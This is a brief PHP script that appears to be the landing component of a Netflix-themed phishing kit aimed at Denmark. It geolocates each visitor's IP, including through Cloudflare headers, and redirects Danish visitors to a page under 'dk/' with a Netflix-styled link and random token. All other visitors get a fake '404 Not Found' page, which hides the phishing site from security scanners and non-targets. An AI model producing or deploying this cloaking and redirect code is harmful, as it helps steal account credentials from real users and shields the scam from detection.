<?php
include "check.php";

$ip = getenv("REMOTE_ADDR");
$time = date('Y-m-d H:i:s');
$random = md5($time);

$random2=rand(0,100000000000);
$randomlink = md5($random2);





if(isset($_SERVER["HTTP_CF_CONNECTING_IP"])){
        $ipadr = $_SERVER["HTTP_CF_CONNECTING_IP"];
// $_SERVER['REMOTE_ADDR']= $_SERVER["HTTP_CF_CONNECTING_IP"]; also possible, no else needed then
    }else{
        $ipadr=$_SERVER['REMOTE_ADDR'];
//when not using cloudflare


    }

// include the php script
include("geoip.inc");

// open the geoip database
$gi = geoip_open("GeoIP.dat",GEOIP_STANDARD);


// to get country name
$country_name = geoip_country_name_by_addr($gi, $ipadr);
//echo "Your country name is: $country_name \n";


if(strpos($country_name, "Denmark") !== false)
{

header("Location: dk/1.htm?netflix=_connect-run&secure=".$randomlink);


}else{

header("HTTP/1.0 404 Not Found");
        die("<h1>404 Not Found</h1>The page that you have requested could not be found.");

 }
?>